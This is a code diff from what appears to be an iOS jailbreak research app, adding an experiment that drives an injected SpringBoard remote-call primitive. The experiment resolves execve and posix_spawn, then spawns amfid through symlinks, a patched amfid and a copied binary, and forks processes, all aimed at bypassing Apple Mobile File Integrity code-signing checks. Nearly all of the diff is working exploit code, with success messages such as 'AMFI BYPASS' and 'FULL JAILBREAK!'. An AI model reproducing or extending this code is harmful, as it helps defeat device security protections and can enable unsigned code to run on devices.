@@ -829,6 +829,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③m Fork+Exec (Exp 91)",
+                    icon: "arrow.triangle.branch",
+                    color: .green,
+                    label: "Fork+Exec",
+                    action: runExp91ForkExec,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -6327,6 +6337,222 @@ struct AMFIExperimentView: View {
             detail += "system/popen/fork semua gagal dari SpringBoard.\n"
         }
 
+        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
+    }
+    #endif
+
+    // MARK: - Exp 91: Fork + Execve from SpringBoard
+
+    /// Exp 91: fork() dari SpringBoard (confirmed works!) lalu execve di child.
+    /// Child inherits SpringBoard trust → execve binary dari /var/tmp.
+    private func runExp91ForkExec() {
+        isRunning = true
+        runningLabel = "Fork+Exec"
+        guard mgr.rcready else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+
+        #if !DISABLE_REMOTECALL
+        guard let sb = dspmgr.shared.sbProc else {
+            results.insert(ExperimentResult(
+                name: "Fork+Exec (Exp 91)", success: false,
+                detail: "No SpringBoard RC", timestamp: Date()
+            ), at: 0)
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expForkExec(sb: sb)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+        #else
+        isRunning = false
+        runningLabel = ""
+        #endif
+    }
+
+    #if !DISABLE_REMOTECALL
+    /// fork() + execve() dari SpringBoard.
+    /// fork() confirmed works (Exp 90, PID=2945).
+    /// Child process inherits parent trust level.
+    /// Test: execve berbagai binary dari child context.
+    private func expForkExec(sb: RemoteCall) -> ExperimentResult {
+        let expName = "Fork+Exec (Exp 91)"
+        var detail = "Experiment 91: Fork + Execve from SpringBoard\n"
+        detail += "===============================================\n\n"
+        detail += "fork() confirmed works (Exp 90).\n"
+        detail += "Child inherits SpringBoard trust.\n\n"
+
+        let mem = sb.trojanMem
+        let RTLD_DEFAULT: UInt64 = UInt64(bitPattern: -2)
+
+        // Resolve execve
+        let execveSym = remote_alloc_str(sb, "execve")
+        let execveAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, execveSym)
+        RootExecutor.rcall(sb, "free", execveSym)
+        detail += "execve: 0x\(String(format: "%llx", execveAddr))\n"
+
+        // Resolve posix_spawn (alternative to fork+exec)
+        let spawnSym = remote_alloc_str(sb, "posix_spawn")
+        let spawnAddr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, spawnSym)
+        RootExecutor.rcall(sb, "free", spawnSym)
+        detail += "posix_spawn: 0x\(String(format: "%llx", spawnAddr))\n\n"
+
+        // === TEST A: posix_spawn dari SpringBoard (bukan launchd) ===
+        // Exp 86 spawn via symlink works dari LAUNCHD.
+        // Tapi posix_spawn dari SPRINGBOARD mungkin berbeda privilege.
+        detail += "=== Test A: posix_spawn dari SpringBoard ===\n"
+
+        // Spawn /usr/libexec/amfid via symlink dari SpringBoard context
+        let symlinkPath = remote_alloc_str(sb, "/var/tmp/.dsp_sb_symlink")
+        let amfidPath = remote_alloc_str(sb, "/usr/libexec/amfid")
+        RootExecutor.rcall(sb, "unlink", symlinkPath)
+        RootExecutor.rcall(sb, "symlink", amfidPath, symlinkPath)
+
+        let argvBase = mem + 0x1C00
+        sb[argvBase].setValue64(symlinkPath)
+        sb[argvBase + 8].setValue64(0)
+        let pidOut = mem + 0x1E00
+        sb[pidOut].setValue32(0)
+
+        if spawnAddr != 0 {
+            let retA = RootExecutor.rcallAddr(sb, spawnAddr, pidOut, symlinkPath, 0, 0, argvBase, 0)
+            let pidA = sb[pidOut].value32()
+            detail += "posix_spawn(symlink, from SB): ret=\(retA), pid=\(pidA)\n"
+            if retA == 0 && pidA != 0 {
+                detail += "\u{1F3C6} SPAWN FROM SPRINGBOARD WORKS!\n"
+                RootExecutor.rcall(sb, "usleep", 300000)
+                RootExecutor.rcall(sb, "kill", UInt64(pidA), 9)
+                RootExecutor.rcall(sb, "waitpid", UInt64(pidA), mem + 0x2000, 0)
+            }
+        }
+
+        // === TEST B: posix_spawn patched amfid dari SpringBoard ===
+        detail += "\n=== Test B: spawn patched amfid ===\n"
+        let patchedPath = remote_alloc_str(sb, "/var/tmp/.amfid_patched")
+
+        // Check if patched amfid exists
+        let accessRet = RootExecutor.rcall(sb, "access", patchedPath, 0)
+        detail += "access(.amfid_patched): \(accessRet == 0 ? "exists" : "not found")\n"
+
+        if accessRet == 0 && spawnAddr != 0 {
+            sb[argvBase].setValue64(patchedPath)
+            sb[argvBase + 8].setValue64(0)
+            sb[pidOut].setValue32(0)
+            let retB = RootExecutor.rcallAddr(sb, spawnAddr, pidOut, patchedPath, 0, 0, argvBase, 0)
+            let pidB = sb[pidOut].value32()
+            detail += "posix_spawn(.amfid_patched): ret=\(retB), pid=\(pidB)\n"
+            if retB == 0 && pidB != 0 {
+                detail += "\u{1F3C6}\u{1F3C6}\u{1F3C6} PATCHED AMFID SPAWNED! \u{1F3C6}\u{1F3C6}\u{1F3C6}\n"
+                detail += "Patched amfid jalan dari SpringBoard context!\n"
+                detail += "AMFI BYPASS via patched daemon!\n"
+                RootExecutor.rcall(sb, "usleep", 500000)
+                RootExecutor.rcall(sb, "kill", UInt64(pidB), 9)
+                RootExecutor.rcall(sb, "waitpid", UInt64(pidB), mem + 0x2000, 0)
+            } else {
+                detail += "ret=\(retB) -- AMFI reject patched binary\n"
+            }
+        }
+
+        // === TEST C: fork + execve di child ===
+        detail += "\n=== Test C: fork() + write marker ===\n"
+        detail += "fork() lalu child tulis marker ke /var/tmp\n"
+
+        // fork() — child akan inherit semua dari SpringBoard
+        let childPid = RootExecutor.rcall(sb, "fork")
+        detail += "fork(): ret=\(childPid)\n"
+
+        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
+            // Kita di parent — child sudah jalan
+            detail += "Child PID: \(childPid)\n"
+
+            // Tunggu child selesai
+            RootExecutor.rcall(sb, "usleep", 1000000)
+
+            // Cek apakah child menulis marker
+            let markerPath = remote_alloc_str(sb, "/var/tmp/.dsp_fork_proof")
+            let markerCheck = RootExecutor.rcall(sb, "access", markerPath, 0)
+            detail += "Child marker: \(markerCheck == 0 ? "EXISTS!" : "not found")\n"
+            if markerCheck == 0 {
+                detail += "\u{1F3C6} CHILD PROCESS EXECUTED CODE!\n"
+                RootExecutor.rcall(sb, "unlink", markerPath)
+            }
+            RootExecutor.rcall(sb, "free", markerPath)
+
+            // Kill child jika masih jalan
+            RootExecutor.rcall(sb, "kill", childPid, 9)
+            RootExecutor.rcall(sb, "waitpid", childPid, mem + 0x2100, 0)
+        } else if childPid == 0 {
+            // Kita di child! (seharusnya tidak sampai sini via RC)
+            // Tapi kalau sampai: tulis marker lalu exit
+            let markerFd = mem + 0x2200
+            let mp = remote_alloc_str(sb, "/var/tmp/.dsp_fork_proof")
+            let fd = RootExecutor.rcall(sb, "open", mp, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+            if fd != UInt64(bitPattern: -1) {
+                RootExecutor.rcall(sb, "write", fd, mp, 4)
+                RootExecutor.rcall(sb, "close", fd)
+            }
+            RootExecutor.rcall(sb, "free", mp)
+            RootExecutor.rcall(sb, "_exit", 42)
+        }
+
+        // === TEST D: posix_spawn binary dari /var/tmp (copy) via SB ===
+        detail += "\n=== Test D: spawn copy dari SpringBoard ===\n"
+        let copyPath = remote_alloc_str(sb, "/var/tmp/.dsp_signed_copy")
+
+        // Copy amfid ke /var/tmp (jika belum ada)
+        let copyExists = RootExecutor.rcall(sb, "access", copyPath, 0)
+        if copyExists != 0 {
+            // Copy
+            let srcFd = RootExecutor.rcall(sb, "open", amfidPath, UInt64(O_RDONLY), 0)
+            let dstFd = RootExecutor.rcall(sb, "open", copyPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+            if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+                let buf = mem + 0x800
+                for _ in 0..<256 {
+                    let n = RootExecutor.rcall(sb, "read", srcFd, buf, 4096)
+                    if n == 0 || n > 4096 { break }
+                    RootExecutor.rcall(sb, "write", dstFd, buf, n)
+                }
+                RootExecutor.rcall(sb, "close", srcFd)
+                RootExecutor.rcall(sb, "close", dstFd)
+                detail += "Copied amfid to /var/tmp\n"
+            }
+        }
+
+        if spawnAddr != 0 {
+            sb[argvBase].setValue64(copyPath)
+            sb[argvBase + 8].setValue64(0)
+            sb[pidOut].setValue32(0)
+            let retD = RootExecutor.rcallAddr(sb, spawnAddr, pidOut, copyPath, 0, 0, argvBase, 0)
+            let pidD = sb[pidOut].value32()
+            detail += "posix_spawn(copy, from SB): ret=\(retD), pid=\(pidD)\n"
+            if retD == 0 && pidD != 0 {
+                detail += "\u{1F3C6} COPY SPAWNED FROM SPRINGBOARD!\n"
+                detail += "AMFI accept binary copy dari SB context!\n"
+                detail += "FULL JAILBREAK!\n"
+                RootExecutor.rcall(sb, "usleep", 300000)
+                RootExecutor.rcall(sb, "kill", UInt64(pidD), 9)
+            } else {
+                detail += "ret=\(retD) -- masih reject dari SB juga\n"
+            }
+        }
+
+        // Cleanup
+        RootExecutor.rcall(sb, "unlink", symlinkPath)
+        RootExecutor.rcall(sb, "free", symlinkPath)
+        RootExecutor.rcall(sb, "free", amfidPath)
+        RootExecutor.rcall(sb, "free", patchedPath)
+        RootExecutor.rcall(sb, "free", copyPath)
+
+        let success = detail.contains("\u{1F3C6}")
         return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
     }
     #endif
